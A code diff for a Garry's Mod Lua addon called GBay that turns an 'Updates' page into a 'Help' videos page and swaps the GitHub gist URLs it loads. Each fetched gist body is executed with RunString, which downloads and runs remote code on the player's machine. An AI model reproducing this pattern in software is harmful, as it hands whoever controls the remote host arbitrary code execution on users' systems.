@@ -1,5 +1,5 @@
-function GBayViewUpdatesFull(DFrame, data)
-	if IsValid(HomePanel) then HomePanel:Remove() end
+function GBayHelpPageFull(DFrame, data)
+  if IsValid(HomePanel) then HomePanel:Remove() end
 	if IsValid(HomePanel2) then HomePanel2:Remove() end
 	if !IsValid(DFrame) then return end
 	LocalPlayer().TabCurrentlyOn = "Updates"
@@ -11,8 +11,8 @@ function GBayViewUpdatesFull(DFrame, data)
 	HomePanel:ShowCloseButton( false )
   local gbaywefailed = false
 	HomePanel.Paint = function(s, w, h)
-    draw.SimpleText("What's new?","GBayLabelFontBold",w / 2,30,Color( 137, 137, 137, 255 ),TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
-    draw.SimpleText("Here we can check what is new with GBay!","GBayLabelFont",w / 2,50,Color( 137, 137, 137, 255 ),TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    draw.SimpleText("Need some help?","GBayLabelFontBold",w / 2,30,Color( 137, 137, 137, 255 ),TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    draw.SimpleText("Here you can watch some videos related to GBay help!","GBayLabelFont",w / 2,50,Color( 137, 137, 137, 255 ),TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     draw.RoundedBox(0,0,70,w,2,Color(221,221,221))
     if gbaywefailed then
       draw.SimpleText("Looks like something went wrong!","GBayLabelFont",w / 2,h/2 - 10,Color( 137, 137, 137, 255 ),TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
@@ -27,9 +27,9 @@ function GBayViewUpdatesFull(DFrame, data)
 	ScrollList:SetSpacing( 20 )
 	ScrollList:EnableVerticalScrollbar( true )
 
-	http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/134e58fc74866218b8d0fe7edb01caa0/raw/GBay%2520Updates%2520Versions",function(body)
+  http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/ff3b312717a5aa04ff31a60181e78abd/raw/GBay%2520Videos%2520Videos",function(body)
 		RunString(body)
-		http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/9ca699471e82b1bde1b26454ffaf6ad1/raw/GBay%2520Updates",function(body)
+		http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/5c4ce8c08f9afdeaba8473c67570a8ae/raw/GBay%2520Videos",function(body)
 			RunString(body)
 		end,function(error)
 			gbaywefailed = true
@@ -38,4 +38,8 @@ function GBayViewUpdatesFull(DFrame, data)
 	end,function(error)
 		print("error: "..error)
 	end)
+end
+
+function GBayHelpPageSmall(DFrame, data)
+
 end
